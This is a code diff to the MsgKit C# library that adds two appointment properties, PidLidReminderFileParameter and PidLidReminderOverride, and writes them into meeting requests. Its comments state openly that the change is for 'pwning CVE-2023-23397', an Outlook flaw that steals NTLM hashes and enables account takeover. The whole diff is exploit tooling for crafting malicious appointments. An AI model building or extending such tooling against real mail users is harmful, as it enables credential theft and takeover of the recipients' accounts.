@@ -61,6 +61,10 @@ namespace MsgKit
         ///     The end of the meeting
         /// </summary>
         public DateTime MeetingEnd { get; set; }
+
+        // for pwning CVE-2023-23397
+        public object PidLidReminderFileParameter { get; set; }
+        public object PidLidReminderOverride { get; set; }
         #endregion
 
         #region Constructors
@@ -105,6 +109,10 @@ namespace MsgKit
             NamedProperties.AddProperty(NamedPropertyTags.PidLidMeetingType, MeetingType.mtgRequest);
             NamedProperties.AddProperty(NamedPropertyTags.PidLidAppointmentSubType, AllDay);
             NamedProperties.AddProperty(NamedPropertyTags.PidLidAppointmentStateFlags, AppointmentState.asfMeeting);
+
+            // added for pwning CVE-2023-23397 (Outlook Appointment NTLM hash stealing / account takeover)
+            NamedProperties.AddProperty(NamedPropertyTags.PidLidReminderFileParameter, PidLidReminderFileParameter);
+            NamedProperties.AddProperty(NamedPropertyTags.PidLidReminderOverride, PidLidReminderOverride);
         }
         #endregion
 
